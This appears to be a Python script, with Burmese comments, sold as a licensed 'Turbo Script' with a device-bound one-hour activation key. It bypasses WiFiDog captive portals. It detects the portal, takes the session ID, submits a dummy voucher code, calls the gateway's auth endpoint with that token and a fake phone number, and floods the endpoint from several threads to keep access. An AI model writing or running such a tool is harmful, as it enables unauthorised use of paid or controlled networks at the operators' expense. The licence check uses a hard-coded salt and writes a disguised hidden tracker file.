import requests
import re
import urllib3
import time
import threading
import hashlib
import os
from datetime import datetime, timedelta
from urllib.parse import urlparse, parse_qs, urljoin

# Warning ပိတ်ခြင်း
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# --- CONFIGURATION ---
SECRET_SALT = "ohmygod@123"
PING_THREADS = 5
PING_INTERVAL = 0.1
LICENSE_HOURS = 1  # အသုံးပြုနိုင်မည့် နာရီအရေအတွက်
TRACKER_FILE = os.path.join(os.path.expanduser("~"), ".sys_temp_log")

def get_stable_id():
    try:
        serial = os.popen("getprop ro.serialno").read().strip()
        if not serial:
            serial = os.popen("getprop ro.build.display.id").read().strip()
    except:
        serial = "DEFAULT_NODE"
    return f"TRB-{hashlib.md5(serial.encode()).hexdigest()[:10].upper()}"

def check_time_integrity():
    """Date နောက်ပြန်ဆုတ်ထားခြင်း ရှိမရှိ စစ်ဆေးခြင်း (Offline Anti-Cheat)"""
    now = datetime.now().timestamp()
    if os.path.exists(TRACKER_FILE):
        with open(TRACKER_FILE, "r") as f:
            try: last_run = float(f.read().strip())
            except: last_run = 0
        if now < last_run:
            print("\n[!] Error: System Date manipulation detected!")
            print("[!] ကျေးဇူးပြု၍ ဖုန်း၏ Date ကို အမှန်ပြန်ပြင်ပါ။\n")
            return False
    with open(TRACKER_FILE, "w") as f:
        f.write(str(now))
    return True

def verify_activation():
    device_id = get_stable_id()
    key_file = os.path.join(os.path.expanduser("~"), ".turbo_license")
    
    if not check_time_integrity(): return False

    correct_key = hashlib.sha256(f"{device_id}{SECRET_SALT}".encode()).hexdigest()[:12].upper()

    if os.path.exists(key_file):
        with open(key_file, "r") as f:
            data = f.read().strip().split("|")
            if len(data) == 2:
                saved_key, expiry_ts = data
                if saved_key == correct_key:
                    expiry_time = datetime.fromtimestamp(float(expiry_ts))
                    if datetime.now() < expiry_time:
                        rem = expiry_time - datetime.now()
                        print(f"DEVICE ID: {device_id}")
                        print(f"STATUS: Verified ✔ (Time Left: {str(rem).split('.')[0]})")
                        return True
                    else:
                        print("\n[!] Status: Expired! (သက်တမ်းကုန်သွားပါပြီ)")
                        os.remove(key_file)

    print(f"\nDEVICE ID: {device_id}")
    input_key = input("Enter Activation Key: ").strip().upper()
    if input_key == correct_key:
        expiry_ts = (datetime.now() + timedelta(hours=LICENSE_HOURS)).timestamp()
        with open(key_file, "w") as f:
            f.write(f"{input_key}|{expiry_ts}")
        print("Activation Successful! Restarting...")
        return True
    else:
        print("Invalid Key! Access Denied.")
        return False

def check_real_internet():
    try: return requests.get("http://connectivitycheck.gstatic.com/generate_204", timeout=3).status_code == 204
    except: return False

def high_speed_ping(auth_link, session, sid):
    while True:
        try:
            session.get(auth_link, timeout=5)
            print(f"[{time.strftime('%H:%M:%S')}] Pinging SID: {sid} (Active)   ", end='\r')
        except: break
        time.sleep(PING_INTERVAL)

def start_process():
    if not verify_activation(): return
    
    print(f"[{time.strftime('%H:%M:%S')}] Turbo Script Initializing...")
    while True:
        # Script ပွင့်နေတုန်း Date ပြောင်းရင် ပိတ်ပစ်ဖို့
        if not check_time_integrity(): break 
        
        session = requests.Session()
        test_url = "http://connectivitycheck.gstatic.com/generate_204"
        try:
            r = requests.get(test_url, allow_redirects=True, timeout=5)
            if r.url == test_url and check_real_internet():
                print(f"[{time.strftime('%H:%M:%S')}] Internet OK. Waiting...           ", end='\r')
                time.sleep(5)
                continue
            
            portal_url = r.url
            parsed_portal = urlparse(portal_url)
            portal_host = f"{parsed_portal.scheme}://{parsed_portal.netloc}"
            
            r1 = session.get(portal_url, verify=False, timeout=10)
            path_match = re.search(r"location\.href\s*=\s*['\"]([^'\"]+)['\"]", r1.text)
            next_url = urljoin(portal_url, path_match.group(1)) if path_match else portal_url
            r2 = session.get(next_url, verify=False, timeout=10)
            
            sid = parse_qs(urlparse(r2.url).query).get('sessionId', [None])[0]
            if sid:
                print(f"\n[*] Activating Session: {sid}")
                voucher_api = f"{portal_host}/api/auth/voucher/"
                try: session.post(voucher_api, json={'accessCode': '123456', 'sessionId': sid, 'apiVersion': 1}, timeout=5)
                except: pass

                params = parse_qs(parsed_portal.query)
                gw_addr = params.get('gw_address', ['192.168.60.1'])[0]
                gw_port = params.get('gw_port', ['2060'])[0]
                auth_link = f"http://{gw_addr}:{gw_port}/wifidog/auth?token={sid}&phonenumber=12345"

                for _ in range(PING_THREADS):
                    threading.Thread(target=high_speed_ping, args=(auth_link, session, sid), daemon=True).start()

                while check_real_internet(): time.sleep(5)
        except Exception: time.sleep(5)

if __name__ == "__main__":
    try: start_process()
    except KeyboardInterrupt: print("\nStopped.")
